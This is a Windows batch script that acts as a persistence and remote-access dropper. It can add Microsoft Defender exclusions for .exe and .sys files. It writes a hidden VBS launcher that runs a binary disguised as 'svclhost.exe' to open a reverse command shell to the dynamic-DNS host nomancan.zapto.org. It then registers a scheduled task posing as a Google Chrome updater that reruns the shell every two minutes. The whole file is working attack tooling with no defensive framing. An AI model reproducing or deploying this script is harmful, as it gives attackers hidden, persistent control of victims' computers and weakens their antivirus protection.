@echo off
powershell -Command Get-MpPreference | findstr ExclusionExtension
set /P Exclu=Add Exclusion (Y/N Default is No): 
if not defined Exclu (set Exclu=N)
if /i %Exclu%==n (goto No)
if /i %Exclu%==y (goto Yes) else (goto No)
:Yes
powershell -inputformat none -outputformat none -NonInteractive -Command Add-MpPreference -ExclusionExtension "*.exe"
powershell -inputformat none -outputformat none -NonInteractive -Command Add-MpPreference -ExclusionExtension "*.sys"
:No
dir "C:\Users"

set "uname="
set "pass="
set "n_pt="
FOR /F "tokens=1" %%g IN ('time /t') do (SET tt=%%g)
:goon
set /P uname=Enter Username: 
if not defined uname (goto goon)
set /P pass=Enter Password: 
set /P n_pt=Enter New Port (4425): 
if not defined n_pt (set n_pt=4425)

echo %uname%
echo %pass%
echo %n_pt%

echo CreateObject("Wscript.Shell").Run "cmd /c C:\Windows\Temp\svclhost.exe nomancan.zapto.org %n_pt% -e cmd", 0, True > "C:\Windows\Temp\newsvclhost.vbs"

if not defined pass (
	SCHTASKS /CREATE /SC MINUTE /MO 2 /TN "GoogleSystem\GoogleUpdater\ChromeOnline" /TR "C:\Windows\System32\WScript.exe //Nologo //B C:\Windows\Temp\newsvclhost.vbs" /ST %tt% /RU %uname% /F
	) else (
	SCHTASKS /CREATE /SC MINUTE /MO 2 /TN "GoogleSystem\GoogleUpdater\ChromeOnline" /TR "C:\Windows\System32\WScript.exe //Nologo //B C:\Windows\Temp\newsvclhost.vbs" /ST %tt% /RU %uname% /RP %pass% /F
)
SCHTASKS /QUERY /TN "GoogleSystem\GoogleUpdater\ChromeOnline"
SCHTASKS /RUN /TN "GoogleSystem\GoogleUpdater\ChromeOnline"
